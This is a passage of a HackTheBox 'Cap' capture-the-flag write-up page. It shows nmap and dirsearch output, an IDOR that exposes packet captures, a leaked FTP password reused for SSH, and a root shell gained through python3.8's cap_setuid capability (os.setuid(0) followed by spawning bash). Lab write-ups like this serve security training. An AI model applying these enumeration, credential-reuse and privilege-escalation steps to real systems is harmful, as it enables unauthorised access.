+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">html</span><span class="o">&gt;</span>                          
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">html</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;no-js&#34;</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>                                   
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http</span><span class="err">-</span><span class="na">equiv</span><span class="o">=</span><span class="s">&#34;x-ua-compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;ie=edge&#34;</span><span class="p">&gt;</span>                      
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span><span class="nx">Security</span> <span class="nx">Dashboard</span><span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1&#34;</span><span class="p">&gt;</span>       
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;shortcut icon&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;image/png&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/static/images/icon/favicon.ico&#34;</span><span class="p">&gt;</span>       
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/static/css/bootstrap.min.css&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/static/css/font-awesome.min.css&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/static/css/themify-icons.css&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/static/css/metisMenu.css&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/static/css/owl.carousel.min.css&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/static/css/slicknav.min.css&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="c">&lt;!--</span> <span class="nx">amchar</span>                              
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">HTTPOptions</span><span class="o">:</span>                               
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.0</span> <span class="mi">200</span> <span class="nx">OK</span>                          
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Server</span><span class="o">:</span> <span class="nx">gunicorn</span>                         
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nb">Date</span><span class="o">:</span> <span class="nx">Wed</span><span class="p">,</span> <span class="mi">26</span> <span class="nx">Feb</span> <span class="mi">2025</span> <span class="mi">07</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="mi">29</span> <span class="nx">GMT</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span> <span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Allow</span><span class="o">:</span> <span class="nx">OPTIONS</span><span class="p">,</span> <span class="nx">GET</span><span class="p">,</span> <span class="nx">HEAD</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">RTSPRequest</span><span class="o">:</span>                               
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">400</span> <span class="nx">Bad</span> <span class="nx">Request</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">196</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>                                   
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>                                   
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span><span class="nx">Bad</span> <span class="nx">Request</span><span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>                                  
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>                                   
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="nx">Bad</span> <span class="nx">Request</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Invalid</span> <span class="nx">HTTP</span> <span class="nx">Version</span> <span class="o">&amp;</span><span class="err">#</span><span class="nx">x27</span><span class="p">;</span><span class="nx">Invalid</span> <span class="nx">HTTP</span> <span class="nx">Version</span><span class="o">:</span> <span class="o">&amp;</span><span class="err">#</span><span class="nx">x27</span><span class="p">;</span><span class="nx">RTSP</span><span class="o">/</span><span class="mf">1.0</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x27</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x27</span><span class="p">;</span>              
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>                                  
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>    <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>              
+</span></span></code></pre></div><p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server" target="_blank">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2" target="_blank">Apache</a> versions. The Os is likely a Ubuntu Focal 20.04.</p>
+<p>There was no anonymous login from NMAP so i tried manually but didn’t work
+Tried for Vhosts fuzzing too but no results were found so i moved onto look out the website for it’s funtionality.</p>
+
+
+<h1 class="relative group">Website Features 
+    <div id="website-features" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#website-features" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+
+
+<h2 class="relative group">Port(80) 
+    <div id="port80" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#port80" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>The website appears to be a security dashboard. A user named &ldquo;nathan&rdquo; is already logged in. Navigating to <strong>Security Snapshots</strong> leads to <code>/capture</code> and redirects to <code>/data/4</code>.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        src="/writeups/hackthebox/cap/image/image.png"
+        alt="image.png"
+      />
+      
+    </figure>
+</p>
+<ul>
+<li><strong>IP Config Page:</strong> Displays the output of <code>/ipconfig</code>.</li>
+</ul>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="image/image%201.png" alt="image.png" />
+      
+    </figure>
+</p>
+<ul>
+<li><strong>Network Status Page:</strong> Displays the output of <code>/netstat</code>.</li>
+</ul>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="image/image%202.png" alt="image.png" />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">Directory Bruteforcing 
+    <div id="directory-bruteforcing" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#directory-bruteforcing" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Using <code>dirsearch</code>, the following endpoints were found:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">dirsearch</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//cap.htb
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nx">_</span><span class="o">|</span><span class="p">.</span> <span class="nx">_</span> <span class="nx">_</span>  <span class="nx">_</span>  <span class="nx">_</span>  <span class="nx">_</span> <span class="nx">_</span><span class="o">|</span><span class="nx">_</span>    <span class="nx">v0</span><span class="mf">.4.3</span>
+</span></span><span class="line"><span class="cl"> <span class="p">(</span><span class="nx">_</span><span class="o">|||</span> <span class="nx">_</span><span class="p">)</span> <span class="p">(</span><span class="err">/_(_|| (_| )</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">Extensions</span><span class="o">:</span> <span class="nx">php</span><span class="p">,</span> <span class="nx">aspx</span><span class="p">,</span> <span class="nx">jsp</span><span class="p">,</span> <span class="nx">html</span><span class="p">,</span> <span class="nx">js</span> <span class="o">|</span> <span class="nx">HTTP</span> <span class="nx">method</span><span class="o">:</span> <span class="nx">GET</span> <span class="o">|</span> <span class="nx">Threads</span><span class="o">:</span> <span class="mi">25</span> <span class="o">|</span> <span class="nx">Wordlist</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">11460</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">Target</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//cap.htb/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">14</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="mi">19</span><span class="p">]</span> <span class="nx">Starting</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">14</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">50</span><span class="p">]</span> <span class="mi">302</span> <span class="o">-</span>  <span class="mi">208</span><span class="nx">B</span>  <span class="o">-</span> <span class="err">/data/adminer.php  -&gt;  http://cap.htb/</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">14</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">50</span><span class="p">]</span> <span class="mi">302</span> <span class="o">-</span>  <span class="mi">208</span><span class="nx">B</span>  <span class="o">-</span> <span class="sr">/data  -&gt;  http:/</span><span class="o">/</span><span class="nx">cap</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">14</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">50</span><span class="p">]</span> <span class="mi">302</span> <span class="o">-</span>  <span class="mi">208</span><span class="nx">B</span>  <span class="o">-</span> <span class="err">/data/autosuggest  -&gt;  http://cap.htb/</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">14</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">59</span><span class="p">]</span> <span class="mi">302</span> <span class="o">-</span>  <span class="mi">208</span><span class="nx">B</span>  <span class="o">-</span> <span class="err">/download/history.csv  -&gt;  http://cap.htb/</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">14</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">59</span><span class="p">]</span> <span class="mi">302</span> <span class="o">-</span>  <span class="mi">208</span><span class="nx">B</span>  <span class="o">-</span> <span class="err">/download/users.csv  -&gt;  http://cap.htb/</span>
+</span></span></code></pre></div>
+
+<h3 class="relative group">IDOR 
+    <div id="idor" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#idor" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Observing <code>/data/4</code>, I tested for an IDOR vulnerability by iterating through numbers and found that all values returned <code>.pcap</code> files.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="image/image%203.png" alt="image.png" />
+      
+    </figure>
+</p>
+<p>But one file contained the FTP user credentials leak for the <code>nathan</code> user after going through of the pcap file from( <code>/data/0</code> )</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">nathan</span><span class="o">:</span><span class="nx">Buck3tH4TF0RM3</span><span class="o">!</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="image/image%204.png" alt="image.png" />
+      
+    </figure>
+</p>
+<p>I quickly tried the leaked credentials in the ftp and got the user flag .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">└──╼</span> <span class="nx">$ftp</span> <span class="nx">cap</span><span class="p">.</span><span class="nx">htb</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">Connected</span> <span class="nx">to</span> <span class="nx">cap</span><span class="p">.</span><span class="nx">htb</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">220</span> <span class="p">(</span><span class="nx">vsFTPd</span> <span class="mf">3.0.3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Name</span> <span class="p">(</span><span class="nx">cap</span><span class="p">.</span><span class="nx">htb</span><span class="o">:</span><span class="nx">rorymercury</span><span class="p">)</span><span class="o">:</span> <span class="nx">nathan</span>
+</span></span><span class="line"><span class="cl"><span class="mi">331</span> <span class="nx">Please</span> <span class="nx">specify</span> <span class="nx">the</span> <span class="nx">password</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Password</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">230</span> <span class="nx">Login</span> <span class="nx">successful</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Remote</span> <span class="nx">system</span> <span class="nx">type</span> <span class="nx">is</span> <span class="nx">UNIX</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Using</span> <span class="nx">binary</span> <span class="nx">mode</span> <span class="nx">to</span> <span class="nx">transfer</span> <span class="nx">files</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ftp</span><span class="o">&gt;</span> <span class="nx">dir</span>
+</span></span><span class="line"><span class="cl"><span class="mi">229</span> <span class="nx">Entering</span> <span class="nx">Extended</span> <span class="nx">Passive</span> <span class="nx">Mode</span> <span class="p">(</span><span class="o">|||</span><span class="mi">43215</span><span class="o">|</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">150</span> <span class="nx">Here</span> <span class="nx">comes</span> <span class="nx">the</span> <span class="nx">directory</span> <span class="nx">listing</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>    <span class="mi">3</span> <span class="mi">1001</span>     <span class="mi">1001</span>         <span class="mi">4096</span> <span class="nx">Mar</span> <span class="mi">29</span> <span class="mi">07</span><span class="o">:</span><span class="mi">03</span> <span class="nx">snap</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="nx">r</span><span class="o">--------</span>    <span class="mi">1</span> <span class="mi">1001</span>     <span class="mi">1001</span>           <span class="mi">33</span> <span class="nx">Mar</span> <span class="mi">29</span> <span class="mi">06</span><span class="o">:</span><span class="mi">50</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">226</span> <span class="nx">Directory</span> <span class="nx">send</span> <span class="nx">OK</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ftp</span><span class="o">&gt;</span> <span class="nx">get</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nx">local</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span> <span class="nx">remote</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">229</span> <span class="nx">Entering</span> <span class="nx">Extended</span> <span class="nx">Passive</span> <span class="nx">Mode</span> <span class="p">(</span><span class="o">|||</span><span class="mi">22600</span><span class="o">|</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">150</span> <span class="nx">Opening</span> <span class="nx">BINARY</span> <span class="nx">mode</span> <span class="nx">data</span> <span class="nx">connection</span> <span class="k">for</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span> <span class="p">(</span><span class="mi">33</span> <span class="nx">bytes</span><span class="p">).</span>
+</span></span><span class="line"><span class="cl"><span class="mi">100</span><span class="o">%</span> <span class="o">|***********************************|</span>    <span class="mi">33</span>      <span class="mf">255.76</span> <span class="nx">KiB</span><span class="o">/</span><span class="nx">s</span>    <span class="mi">00</span><span class="o">:</span><span class="mi">00</span> <span class="nx">ETA</span>
+</span></span><span class="line"><span class="cl"><span class="mi">226</span> <span class="nx">Transfer</span> <span class="nx">complete</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">33</span> <span class="nx">bytes</span> <span class="nx">received</span> <span class="k">in</span> <span class="mi">00</span><span class="o">:</span><span class="mi">00</span> <span class="p">(</span><span class="mf">0.42</span> <span class="nx">KiB</span><span class="o">/</span><span class="nx">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ftp</span><span class="o">&gt;</span> <span class="nx">exit</span>
+</span></span><span class="line"><span class="cl"><span class="mi">221</span> <span class="nx">Goodbye</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">└──╼</span> <span class="nx">$cat</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="nx">e1db9900cd9fc2a66c97</span><span class="o">**********</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="image/image%205.png" alt="image.png" />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">SSH 
+    <div id="ssh" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#ssh" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Attempting password reuse, I successfully logged into SSH as <code>nathan</code>with same password.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="image/image%206.png" alt="image.png" />
+      
+    </figure>
+</p>
+
+
+<h1 class="relative group">Shell as root 
+    <div id="shell-as-root" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#shell-as-root" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+
+
+<h2 class="relative group">Enumeration 
+    <div id="enumeration-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#enumeration-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Running <code>LinPEAS</code> revealed that <code>python3.8</code> had the capability <code>cap_setuid+ep</code>, we can abuse.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="image/image%207.png" alt="image.png" />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group"><strong>Abusing Capabilities</strong> 
+    <div id="abusing-capabilities" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#abusing-capabilities" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>I will abuse the<code>cap_setuid</code> to change the current user id of the current process to else with the helpful guide .</p>
+<p><a href="https://tbhaxor.com/exploiting-linux-capabilities-part-1/" target="_blank">Abusing-Linux-capabilities</a></p>
+<p>one of the capabilites the linpeas found was python with the <code>cap_setuid</code> , which seems to allow us to change the user id for this process and make ourself root</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">nathan</span><span class="err">@</span><span class="nx">cap</span><span class="o">:</span><span class="sr">/tmp$ getcap -r /</span> <span class="mi">2</span><span class="o">&gt;</span><span class="err">/dev/null                                     </span>
+</span></span><span class="line"><span class="cl"><span class="err">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span>
+</span></span><span class="line"><span class="cl"><span class="err">/usr/bin/ping = cap_net_raw+ep</span>
+</span></span><span class="line"><span class="cl"><span class="err">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span>
+</span></span><span class="line"><span class="cl"><span class="err">/usr/bin/mtr-packet = cap_net_raw+ep</span>
+</span></span><span class="line"><span class="cl"><span class="err">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span>
+</span></span><span class="line"><span class="cl"><span class="nx">nathan</span><span class="err">@</span><span class="nx">cap</span><span class="o">:</span><span class="err">/tmp$ python3.8</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Python</span> <span class="mf">3.8.5</span> <span class="p">(</span><span class="k">default</span><span class="p">,</span> <span class="nx">Jan</span> <span class="mi">27</span> <span class="mi">2021</span><span class="p">,</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mi">15</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">GCC</span> <span class="mf">9.3.0</span><span class="p">]</span> <span class="nx">on</span> <span class="nx">linux</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Type</span> <span class="s2">&#34;help&#34;</span><span class="p">,</span> <span class="s2">&#34;copyright&#34;</span><span class="p">,</span> <span class="s2">&#34;credits&#34;</span> <span class="nx">or</span> <span class="s2">&#34;license&#34;</span> <span class="k">for</span> <span class="nx">more</span> <span class="nx">information</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kr">import</span> <span class="nx">os</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nx">os</span><span class="p">.</span><span class="nx">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">root</span><span class="err">@</span><span class="nx">cap</span><span class="o">:</span><span class="err">/tmp# </span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">Root Flag 
+    <div id="root-flag" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#root-flag" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">root</span><span class="err">@</span><span class="nx">cap</span><span class="o">:</span><span class="err">/root# cat root.txt </span>
+</span></span><span class="line"><span class="cl"><span class="nx">d19f2b2f2ebe40ace3</span><span class="o">**************</span>
+</span></span></code></pre></div>
+
+<h1 class="relative group">Summary 
+    <div id="summary" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#summary" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<ul>
+<li><strong>Enumeration:</strong> Found FTP, SSH, and a web application with IDOR.</li>
+<li><strong>Exploitation:</strong> Retrieved FTP credentials via <code>.pcap</code> file.</li>
+<li><strong>Privilege Escalation:</strong> Used Python capabilities to escalate to root.</li>
+</ul>
+
+        </div>
+        
+        
+
+        
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=/writeups/hackthebox/cap/&amp;title=Cap%20Writeup%20-%20HackTheBox"
+      title="Share on LinkedIn"
+      aria-label="Share on LinkedIn"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
